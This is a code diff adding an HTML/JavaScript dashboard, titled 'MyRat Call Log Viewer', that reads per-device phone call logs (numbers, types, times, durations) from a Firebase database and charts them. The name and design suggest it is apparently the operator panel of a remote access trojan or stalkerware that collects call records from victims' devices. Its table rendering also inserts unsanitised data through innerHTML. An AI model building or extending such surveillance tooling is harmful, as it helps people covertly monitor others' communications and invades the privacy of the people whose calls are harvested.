@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MyRat Call Log Viewer</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+    <style>
+      :root {
+        --primary-color: #4a6fa5;
+        --secondary-color: #e74c3c;
+        --background-color: #f5f7fa;
+        --card-color: #ffffff;
+        --text-color: #333;
+        --border-color: #ddd;
+      }
+
+      * {
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background-color: var(--background-color);
+        color: var(--text-color);
+      }
+
+      header {
+        background-color: var(--primary-color);
+        color: white;
+        padding: 1rem 2rem;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        margin: 0;
+        font-weight: 600;
+      }
+
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 1rem;
+      }
+
+      .dashboard {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 1rem;
+        margin-bottom: 1rem;
+      }
+
+      .card {
+        background-color: var(--card-color);
+        border-radius: 8px;
+        padding: 1rem;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      }
+
+      .stats-container {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 1rem;
+      }
+
+      .stat-card {
+        background-color: var(--card-color);
+        border-radius: 8px;
+        padding: 1rem;
+        text-align: center;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      }
+
+      .stat-card h3 {
+        margin-top: 0;
+        color: var(--primary-color);
+        font-size: 2rem;
+        margin-bottom: 0.5rem;
+      }
+
+      .stat-card p {
+        margin: 0;
+        color: #666;
+        font-size: 0.9rem;
+      }
+
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 1rem;
+      }
+
+      th,
+      td {
+        padding: 0.75rem;
+        text-align: left;
+        border-bottom: 1px solid var(--border-color);
+      }
+
+      th {
+        background-color: rgba(74, 111, 165, 0.1);
+        color: var(--primary-color);
+        font-weight: 600;
+      }
+
+      tr:hover {
+        background-color: rgba(0, 0, 0, 0.02);
+      }
+
+      .call-type {
+        display: inline-block;
+        padding: 0.25rem 0.5rem;
+        border-radius: 4px;
+        font-size: 0.85rem;
+        font-weight: 500;
+      }
+
+      .call-type-Incoming {
+        background-color: rgba(46, 204, 113, 0.2);
+        color: #27ae60;
+      }
+
+      .call-type-Outgoing {
+        background-color: rgba(52, 152, 219, 0.2);
+        color: #2980b9;
+      }
+
+      .call-type-Missed {
+        background-color: rgba(231, 76, 60, 0.2);
+        color: #c0392b;
+      }
+
+      .call-type-Rejected {
+        background-color: rgba(155, 89, 182, 0.2);
+        color: #8e44ad;
+      }
+
+      .call-type-Voicemail {
+        background-color: rgba(241, 196, 15, 0.2);
+        color: #f39c12;
+      }
+
+      .call-type-Unknown {
+        background-color: rgba(149, 165, 166, 0.2);
+        color: #7f8c8d;
+      }
+
+      .chart-container {
+        height: 300px;
+        margin-top: 1rem;
+      }
+
+      .auth-container {
+        max-width: 500px;
+        margin: 2rem auto;
+        padding: 2rem;
+        background-color: var(--card-color);
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+
+      .form-group {
+        margin-bottom: 1rem;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.75rem;
+        border: 1px solid var(--border-color);
+        border-radius: 4px;
+        font-size: 1rem;
+      }
+
+      button {
+        background-color: var(--primary-color);
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 0.75rem 1rem;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      button:hover {
+        background-color: #3d5e8c;
+      }
+
+      .error-message {
+        color: var(--secondary-color);
+        margin-top: 1rem;
+      }
+
+      .loading {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 200px;
+      }
+
+      .spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        border-left-color: var(--primary-color);
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      #deviceSelector {
+        padding: 0.75rem;
+        border: 1px solid var(--border-color);
+        border-radius: 4px;
+        font-size: 1rem;
+        margin-bottom: 1rem;
+        width: 100%;
+      }
+
+      .filter-row {
+        display: flex;
+        gap: 1rem;
+        margin-bottom: 1rem;
+        flex-wrap: wrap;
+      }
+
+      .filter-item {
+        flex: 1;
+        min-width: 200px;
+      }
+
+      .pagination {
+        display: flex;
+        justify-content: center;
+        margin-top: 1rem;
+      }
+
+      .pagination button {
+        margin: 0 0.25rem;
+        background-color: var(--card-color);
+        color: var(--primary-color);
+        border: 1px solid var(--border-color);
+      }
+
+      .pagination button.active {
+        background-color: var(--primary-color);
+        color: white;
+      }
+
+      .pagination button:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      @media (max-width: 768px) {
+        .dashboard {
+          grid-template-columns: 1fr;
+        }
+
+        .stats-container {
+          grid-template-columns: repeat(2, 1fr);
+        }
+
+        th,
+        td {
+          padding: 0.5rem;
+          font-size: 0.9rem;
+        }
+
+        .table-responsive {
+          overflow-x: auto;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>MyRat Call Log Viewer</h1>
+    </header>
+
+    <div class="container">
+      <!-- Authentication Section -->
+      <div id="authSection" class="auth-container">
+        <h2>Admin Login</h2>
+        <p>Enter your Firebase credentials to view call logs</p>
+
+        <div class="form-group">
+          <label for="apiKey">API Key</label>
+          <input type="text" id="apiKey" placeholder="Enter Firebase API Key" />
+        </div>
+
+        <div class="form-group">
+          <label for="projectId">Project ID</label>
+          <input
+            type="text"
+            id="projectId"
+            placeholder="Enter Firebase Project ID"
+          />
+        </div>
+
+        <button id="loginButton">Connect to Firebase</button>
+        <p id="errorMessage" class="error-message hidden"></p>
+      </div>
+
+      <!-- Dashboard Section (Hidden initially) -->
+      <div id="dashboardSection" class="hidden">
+        <div class="filter-row">
+          <div class="filter-item">
+            <label for="deviceSelector">Select Device</label>
+            <select id="deviceSelector"></select>
+          </div>
+          <div class="filter-item">
+            <label for="dateFilter">Date Range</label>
+            <select id="dateFilter">
+              <option value="7">Last 7 days</option>
+              <option value="30">Last 30 days</option>
+              <option value="90">Last 90 days</option>
+              <option value="all" selected>All time</option>
+            </select>
+          </div>
+          <div class="filter-item">
+            <label for="callTypeFilter">Call Type</label>
+            <select id="callTypeFilter">
+              <option value="all" selected>All Types</option>
+              <option value="Incoming">Incoming</option>
+              <option value="Outgoing">Outgoing</option>
+              <option value="Missed">Missed</option>
+              <option value="Rejected">Rejected</option>
+              <option value="Voicemail">Voicemail</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="dashboard">
+          <div class="card">
+            <h2>Call Statistics</h2>
+            <div class="stats-container">
+              <div class="stat-card">
+                <h3 id="totalCallsCount">0</h3>
+                <p>Total Calls</p>
+              </div>
+              <div class="stat-card">
+                <h3 id="incomingCallsCount">0</h3>
+                <p>Incoming</p>
+              </div>
+              <div class="stat-card">
+                <h3 id="outgoingCallsCount">0</h3>
+                <p>Outgoing</p>
+              </div>
+              <div class="stat-card">
+                <h3 id="missedCallsCount">0</h3>
+                <p>Missed</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <h2>Call Distribution</h2>
+            <div class="chart-container">
+              <canvas id="callTypeChart"></canvas>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2>Call Timeline</h2>
+          <div class="chart-container">
+            <canvas id="callTimelineChart"></canvas>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2>Call Log Records</h2>
+          <div class="table-responsive">
+            <table id="callLogTable">
+              <thead>
+                <tr>
+                  <th>Phone Number</th>
+                  <th>Call Type</th>
+                  <th>Date & Time</th>
+                  <th>Duration</th>
+                </tr>
+              </thead>
+              <tbody id="callLogTableBody">
+                <!-- Call log data will be inserted here -->
+              </tbody>
+            </table>
+          </div>
+          <div class="pagination" id="pagination">
+            <!-- Pagination buttons will be inserted here -->
+          </div>
+          <div id="loadingIndicator" class="loading hidden">
+            <div class="spinner"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Firebase configuration and initialization
+      let firestore;
+      let currentDevice = null;
+      let allCallLogs = [];
+      let filteredCallLogs = [];
+      let currentPage = 1;
+      const itemsPerPage = 10;
+
+      // Initialize charts
+      let callTypeChart;
+      let timelineChart;
+
+      // DOM elements
+      const authSection = document.getElementById("authSection");
+      const dashboardSection = document.getElementById("dashboardSection");
+      const apiKeyInput = document.getElementById("apiKey");
+      const projectIdInput = document.getElementById("projectId");
+      const loginButton = document.getElementById("loginButton");
+      const errorMessage = document.getElementById("errorMessage");
+      const deviceSelector = document.getElementById("deviceSelector");
+      const dateFilter = document.getElementById("dateFilter");
+      const callTypeFilter = document.getElementById("callTypeFilter");
+      const callLogTableBody = document.getElementById("callLogTableBody");
+      const loadingIndicator = document.getElementById("loadingIndicator");
+      const pagination = document.getElementById("pagination");
+
+      // Statistics elements
+      const totalCallsCount = document.getElementById("totalCallsCount");
+      const incomingCallsCount = document.getElementById("incomingCallsCount");
+      const outgoingCallsCount = document.getElementById("outgoingCallsCount");
+      const missedCallsCount = document.getElementById("missedCallsCount");
+
+      // Login functionality
+      loginButton.addEventListener("click", () => {
+        const apiKey = apiKeyInput.value.trim();
+        const projectId = projectIdInput.value.trim();
+
+        if (!apiKey || !projectId) {
+          showError("Please enter both API Key and Project ID");
+          return;
+        }
+
+        try {
+          // Initialize Firebase with the provided credentials
+          firebase.initializeApp({
+            apiKey: apiKey,
+            projectId: projectId,
+            authDomain: `${projectId}.firebaseapp.com`,
+          });
+
+          firestore = firebase.firestore();
+
+          // Attempt to fetch devices to verify connection
+          loadDevices()
+            .then(() => {
+              hideError();
+              authSection.classList.add("hidden");
+              dashboardSection.classList.remove("hidden");
+              initializeCharts();
+            })
+            .catch((err) => {
+              showError(`Failed to connect: ${err.message}`);
+            });
+        } catch (err) {
+          showError(`Firebase initialization error: ${err.message}`);
+        }
+      });
+
+      // Load available devices
+      async function loadDevices() {
+        showLoading();
+
+        try {
+          const devicesSnapshot = await firestore.collection("Device").get();
+
+          if (devicesSnapshot.empty) {
+            deviceSelector.innerHTML =
+              '<option value="">No devices found</option>';
+            hideLoading();
+            return;
+          }
+
+          deviceSelector.innerHTML = "";
+          devicesSnapshot.forEach((doc) => {
+            const option = document.createElement("option");
+            option.value = doc.id;
+            option.textContent = `Device ID: ${doc.id}`;
+            deviceSelector.appendChild(option);
+          });
+
+          // Select first device and load its data
+          currentDevice = deviceSelector.value;
+          loadCallLogs();
+        } catch (err) {
+          console.error("Error loading devices:", err);
+          hideLoading();
+          showError(`Error loading devices: ${err.message}`);
+        }
+      }
+
+      // Load call logs for the selected device
+      async function loadCallLogs() {
+        if (!currentDevice) return;
+
+        showLoading();
+
+        try {
+          const callsSnapshot = await firestore
+            .collection("Device")
+            .doc(currentDevice)
+            .collection("calls")
+            .orderBy("date", "desc")
+            .get();
+
+          allCallLogs = [];
+          callsSnapshot.forEach((doc) => {
+            const callData = doc.data();
+            allCallLogs.push(callData);
+          });
+
+          applyFilters();
+          hideLoading();
+        } catch (err) {
+          console.error("Error loading call logs:", err);
+          hideLoading();
+          showError(`Error loading call logs: ${err.message}`);
+        }
+      }
+
+      // Apply filters to call logs
+      function applyFilters() {
+        const dateFilterValue = parseInt(dateFilter.value);
+        const callTypeFilterValue = callTypeFilter.value;
+
+        filteredCallLogs = allCallLogs.filter((call) => {
+          // Apply date filter
+          if (dateFilterValue !== "all" && dateFilterValue > 0) {
+            const cutoffDate = new Date();
+            cutoffDate.setDate(cutoffDate.getDate() - dateFilterValue);
+            if (new Date(call.date) < cutoffDate) {
+              return false;
+            }
+          }
+
+          // Apply call type filter
+          if (
+            callTypeFilterValue !== "all" &&
+            call.type !== callTypeFilterValue
+          ) {
+            return false;
+          }
+
+          return true;
+        });
+
+        // Reset to first page when filters change
+        currentPage = 1;
+
+        // Update UI
+        updateStatistics();
+        updateCharts();
+        renderCallLogs();
+      }
+
+      // Update statistics
+      function updateStatistics() {
+        let incoming = 0,
+          outgoing = 0,
+          missed = 0;
+
+        filteredCallLogs.forEach((call) => {
+          if (call.type === "Incoming") incoming++;
+          else if (call.type === "Outgoing") outgoing++;
+          else if (call.type === "Missed") missed++;
+        });
+
+        totalCallsCount.textContent = filteredCallLogs.length;
+        incomingCallsCount.textContent = incoming;
+        outgoingCallsCount.textContent = outgoing;
+        missedCallsCount.textContent = missed;
+      }
+
+      // Initialize charts
+      function initializeCharts() {
+        // Call Type Distribution Chart
+        const callTypeCtx = document
+          .getElementById("callTypeChart")
+          .getContext("2d");
+        callTypeChart = new Chart(callTypeCtx, {
+          type: "doughnut",
+          data: {
+            labels: [
+              "Incoming",
+              "Outgoing",
+              "Missed",
+              "Rejected",
+              "Voicemail",
+              "Unknown",
+            ],
+            datasets: [
+              {
+                data: [0, 0, 0, 0, 0, 0],
+                backgroundColor: [
+                  "rgba(46, 204, 113, 0.7)",
+                  "rgba(52, 152, 219, 0.7)",
+                  "rgba(231, 76, 60, 0.7)",
+                  "rgba(155, 89, 182, 0.7)",
+                  "rgba(241, 196, 15, 0.7)",
+                  "rgba(149, 165, 166, 0.7)",
+                ],
+                borderColor: [
+                  "rgba(46, 204, 113, 1)",
+                  "rgba(52, 152, 219, 1)",
+                  "rgba(231, 76, 60, 1)",
+                  "rgba(155, 89, 182, 1)",
+                  "rgba(241, 196, 15, 1)",
+                  "rgba(149, 165, 166, 1)",
+                ],
+                borderWidth: 1,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+              legend: {
+                position: "right",
+              },
+            },
+          },
+        });
+
+        // Call Timeline Chart
+        const timelineCtx = document
+          .getElementById("callTimelineChart")
+          .getContext("2d");
+        timelineChart = new Chart(timelineCtx, {
+          type: "line",
+          data: {
+            labels: [],
+            datasets: [
+              {
+                label: "Incoming",
+                data: [],
+                borderColor: "rgba(46, 204, 113, 1)",
+                backgroundColor: "rgba(46, 204, 113, 0.1)",
+                borderWidth: 2,
+                tension: 0.4,
+                fill: true,
+              },
+              {
+                label: "Outgoing",
+                data: [],
+                borderColor: "rgba(52, 152, 219, 1)",
+                backgroundColor: "rgba(52, 152, 219, 0.1)",
+                borderWidth: 2,
+                tension: 0.4,
+                fill: true,
+              },
+              {
+                label: "Missed",
+                data: [],
+                borderColor: "rgba(231, 76, 60, 1)",
+                backgroundColor: "rgba(231, 76, 60, 0.1)",
+                borderWidth: 2,
+                tension: 0.4,
+                fill: true,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            scales: {
+              y: {
+                beginAtZero: true,
+                title: {
+                  display: true,
+                  text: "Number of Calls",
+                },
+              },
+              x: {
+                title: {
+                  display: true,
+                  text: "Date",
+                },
+              },
+            },
+          },
+        });
+      }
+
+      // Update charts with filtered data
+      function updateCharts() {
+        if (!callTypeChart || !timelineChart) return;
+
+        // Update Call Type Distribution Chart
+        const callTypeCounts = {
+          Incoming: 0,
+          Outgoing: 0,
+          Missed: 0,
+          Rejected: 0,
+          Voicemail: 0,
+          Unknown: 0,
+        };
+
+        filteredCallLogs.forEach((call) => {
+          if (callTypeCounts.hasOwnProperty(call.type)) {
+            callTypeCounts[call.type]++;
+          } else {
+            callTypeCounts["Unknown"]++;
+          }
+        });
+
+        callTypeChart.data.datasets[0].data = [
+          callTypeCounts["Incoming"],
+          callTypeCounts["Outgoing"],
+          callTypeCounts["Missed"],
+          callTypeCounts["Rejected"],
+          callTypeCounts["Voicemail"],
+          callTypeCounts["Unknown"],
+        ];
+
+        callTypeChart.update();
+
+        // Update Timeline Chart
+        const timelineData = {};
+        let dateFormat = new Intl.DateTimeFormat("en-US", {
+          month: "short",
+          day: "numeric",
+        });
+
+        // Group calls by date
+        filteredCallLogs.forEach((call) => {
+          const date = new Date(call.date);
+          const formattedDate = dateFormat.format(date);
+
+          if (!timelineData[formattedDate]) {
+            timelineData[formattedDate] = {
+              Incoming: 0,
+              Outgoing: 0,
+              Missed: 0,
+            };
+          }
+
+          if (
+            call.type === "Incoming" ||
+            call.type === "Outgoing" ||
+            call.type === "Missed"
+          ) {
+            timelineData[formattedDate][call.type]++;
+          }
+        });
+
+        // Sort dates
+        const sortedDates = Object.keys(timelineData).sort((a, b) => {
+          return new Date(a) - new Date(b);
+        });
+
+        // Prepare chart data
+        const incomingData = [];
+        const outgoingData = [];
+        const missedData = [];
+
+        sortedDates.forEach((date) => {
+          incomingData.push(timelineData[date]["Incoming"]);
+          outgoingData.push(timelineData[date]["Outgoing"]);
+          missedData.push(timelineData[date]["Missed"]);
+        });
+
+        timelineChart.data.labels = sortedDates;
+        timelineChart.data.datasets[0].data = incomingData;
+        timelineChart.data.datasets[1].data = outgoingData;
+        timelineChart.data.datasets[2].data = missedData;
+
+        timelineChart.update();
+      }
+
+      // Render call logs table
+      function renderCallLogs() {
+        const startIndex = (currentPage - 1) * itemsPerPage;
+        const endIndex = startIndex + itemsPerPage;
+        const paginatedLogs = filteredCallLogs.slice(startIndex, endIndex);
+
+        callLogTableBody.innerHTML = "";
+
+        if (paginatedLogs.length === 0) {
+          const row = document.createElement("tr");
+          row.innerHTML =
+            '<td colspan="4" style="text-align: center;">No call logs found</td>';
+          callLogTableBody.appendChild(row);
+        } else {
+          paginatedLogs.forEach((call) => {
+            const row = document.createElement("tr");
+
+            // Format date
+            const callDate = new Date(call.date);
+            const formattedDate = callDate.toLocaleString();
+
+            // Format duration
+            const durationMinutes = Math.floor(call.duration / 60);
+            const durationSeconds = call.duration % 60;
+            const formattedDuration =
+              (durationMinutes > 0 ? `${durationMinutes}m ` : "") +
+              `${durationSeconds}s`;
+
+            row.innerHTML = `
+                        <td>${call.number || "Unknown"}</td>
+                        <td><span class="call-type call-type-${call.type}">${
+              call.type
+            }</span></td>
+                        <td>${formattedDate}</td>
+                        <td>${formattedDuration}</td>
+                    `;
+
+            callLogTableBody.appendChild(row);
+          });
+        }
+
+        renderPagination();
+      }
+
+      // Render pagination controls
+      function renderPagination() {
+        const totalPages = Math.ceil(filteredCallLogs.length / itemsPerPage);
+
+        pagination.innerHTML = "";
+
+        // Previous button
+        const prevButton = document.createElement("button");
+        prevButton.textContent = "←";
+        prevButton.disabled = currentPage === 1;
+        prevButton.addEventListener("click", () => {
+          if (currentPage > 1) {
+            currentPage--;
+            renderCallLogs();
+          }
+        });
+        pagination.appendChild(prevButton);
+
+        // Page buttons
+        const maxButtons = 5;
+        let startPage = Math.max(1, currentPage - Math.floor(maxButtons / 2));
+        let endPage = Math.min(totalPages, startPage + maxButtons - 1);
+
+        if (endPage - startPage + 1 < maxButtons && startPage > 1) {
+          startPage = Math.max(1, endPage - maxButtons + 1);
+        }
+
+        for (let i = startPage; i <= endPage; i++) {
+          const pageButton = document.createElement("button");
+          pageButton.textContent = i;
+          pageButton.classList.toggle("active", i === currentPage);
+          pageButton.addEventListener("click", () => {
+            currentPage = i;
+            renderCallLogs();
+          });
+          pagination.appendChild(pageButton);
+        }
+
+        // Next button
+        const nextButton = document.createElement("button");
+        nextButton.textContent = "→";
+        nextButton.disabled = currentPage === totalPages || totalPages === 0;
+        nextButton.addEventListener("click", () => {
+          if (currentPage < totalPages) {
+            currentPage++;
+            renderCallLogs();
+          }
+        });
+        pagination.appendChild(nextButton);
+      }
+
+      // Event listeners for filters
+      deviceSelector.addEventListener("change", () => {
+        currentDevice = deviceSelector.value;
+        loadCallLogs();
+      });
+
+      dateFilter.addEventListener("change", applyFilters);
+      callTypeFilter.addEventListener("change", applyFilters);
+
+      // Helper functions
+      function showLoading() {
+        loadingIndicator.classList.remove("hidden");
+      }
+
+      function hideLoading() {
+        loadingIndicator.classList.add("hidden");
+      }
+
+      function showError(message) {
+        errorMessage.textContent = message;
+        errorMessage.classList.remove("hidden");
+      }
+
+      function hideError() {
+        errorMessage.classList.add("hidden");
+      }
+    </script>
+  </body>
+</html>
